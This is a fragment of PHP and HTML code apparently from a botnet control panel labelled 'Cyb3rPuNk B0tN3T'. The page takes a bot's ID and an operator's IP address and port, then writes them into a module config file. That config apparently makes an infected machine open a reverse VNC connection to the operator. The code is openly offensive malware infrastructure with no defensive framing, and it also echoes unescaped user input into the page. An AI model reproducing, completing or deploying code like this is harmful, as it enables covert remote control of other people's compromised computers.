...
<meta charset="UTF-8">
<title>Cyb3rPuNk B0tN3T :: REVERSE VNC </title>
...
document.getElementById("fmrx").submit();
 ...
 {
 document.getElementById("ipx").focus();
 }
 </script>
</head>
...
///////////////////////////////////////////////////////////
	...
	$buf = "[IPX]\nIPTR=". $OUTPUT ."\n";
	$file = fopen("modulos/vncx/CTL.ini", "w");
	$wt = fwrite($file, $buf);
	fclose($file);
...
<img src="media/logo.png">
 ...
 <br>
<center>
<form name="fmrx" method="post" action="vncconnect.php?IDX=<?php 

echo $_GET["IDX"];

?>">
<table width='30%' cellpadding='2' border='0'>
<tr><td colspan="3" align="center"><font style="color: black;"><b>CYBER REVERSE VNC CONNECTION</b></font></td></tr>

<tr><td align="left" valign="center"><font style="color: black;"><b>&nbsp;</b></font></td></tr>

<tr><td align="left" valign="center"><font style="color: black;"><b>IP</b></font></td>
<td align="left" valign="center"><font style="color: black;"><b>PORTA</b></font></td></tr>

<tr><td align="left" valign="center" ><input type="text" size="40" id="ipx" name="ipx"></td>
<td align="left" valign="center"><input type="text" size="7" id="ptr" name="ptr"></td>
<td align="right"><input type="submit" value="CONNECT" style="margin: 0px; height: 26px; line-height: 26px; padding: 0px 10px; cursor: pointer; color: rgb(255, 255, 255); font-size: 12px; font-weight: bold; background: none repeat scroll 0% 0% rgb(241, 90, 35); border: medium none; box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1) inset; border-radius: 2px 2px 2px 2px; transition: all 0.3s ease-in-out 0s;" onclick="javascript: formSubmit();"></td></tr>
